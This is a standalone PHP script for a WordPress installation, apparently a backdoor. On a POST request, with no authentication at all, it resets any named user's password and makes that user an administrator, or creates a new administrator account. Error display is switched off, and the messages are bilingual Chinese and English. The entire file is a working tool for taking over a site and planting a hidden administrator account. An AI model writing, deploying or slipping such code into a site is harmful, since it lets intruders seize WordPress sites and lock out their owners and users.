<?php

ini_set('display_errors', 0);
error_reporting(E_ALL);

$message = '';
$msg_type = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action_admin'])) {

    // Load WordPress Environment
    if (file_exists(dirname(__FILE__) . '/wp-blog-header.php')) {
        require_once(dirname(__FILE__) . '/wp-blog-header.php');
        require_once(ABSPATH . 'wp-includes/registration.php');
        require_once(ABSPATH . 'wp-includes/pluggable.php');
        require_once(ABSPATH . 'wp-includes/user.php');
    } else {
        $message = "Error: 找不到 wp-blog-header.php 文件 (File wp-blog-header.php not found).";
        $msg_type = 'error';
    }

    if (empty($message)) {
        // take input
        $target_user = sanitize_text_field($_POST['username']);
        $new_pass    = $_POST['password'];
        $target_email= sanitize_email($_POST['email']);

        if (empty($target_user) || empty($new_pass)) {
            $message = "错误：用户名和密码不能为空。<br>Error: Username and Password are required.";
            $msg_type = 'error';
        } else {
            // Check User
            $user = get_user_by('login', $target_user);

            // SKENARIO 1: UPDATE / RESET
            if ($user) {
                wp_set_password($new_pass, $user->ID);
                $u_obj = new WP_User($user->ID);
                $u_obj->set_role('administrator');

                $message = "<strong>成功 (Success)!</strong><br>用户 '{$target_user}' 已存在。密码已重置，权限已设为管理员。<br>User exists. Password reset & Role set to Administrator.";
                $msg_type = 'success';
            } 
            // SKENARIO 2: CREATE NEW
            else {
                if (empty($target_email)) {
                    $message = "错误：创建新用户需要邮箱地址。<br>Error: Email is required for new user.";
                    $msg_type = 'error';
                } elseif (email_exists($target_email)) {
                    $message = "错误：该邮箱 '{$target_email}' 已被使用。<br>Error: Email already in use.";
                    $msg_type = 'error';
                } else {
                    $user_id = wp_create_user($target_user, $new_pass, $target_email);
                    if (is_int($user_id)) {
                        $u_obj = new WP_User($user_id);
                        $u_obj->set_role('administrator');
                        $message = "<strong>成功 (Success)!</strong><br>新管理员用户 '{$target_user}' 已创建。<br>New Admin user created.";
                        $msg_type = 'success';
                    } else {
                        $message = "系统错误 (System Error).";
                        $msg_type = 'error';
                    }
                }
            }
        }
    }
}
?>

